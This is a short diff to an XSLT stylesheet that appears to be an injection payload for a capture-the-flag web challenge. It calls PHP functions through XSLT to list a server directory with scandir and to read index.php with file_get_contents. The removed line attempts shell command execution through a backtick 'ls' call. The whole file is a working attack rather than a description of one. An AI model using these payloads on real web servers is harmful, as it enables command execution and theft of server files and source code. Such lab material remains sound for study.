@@ -7,7 +7,7 @@
     extension-element-prefixes="exsl" xsl:version="1.0"> 
 <body style="font-family:Arial;font-size:9pt;background-color:#AABBCC">
     
-<xsl:variable  name="scand"   select="php:function('echo','`ls -las /challenge/web-serveur/ch50`')" />
+<xsl:variable  name="scand"   select="php:functionString('scandir','/challenge/web-serveur/ch50')" />
  
 <xsl:variable  name="header"  select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
 <xsl:for-each select="beers/beer">
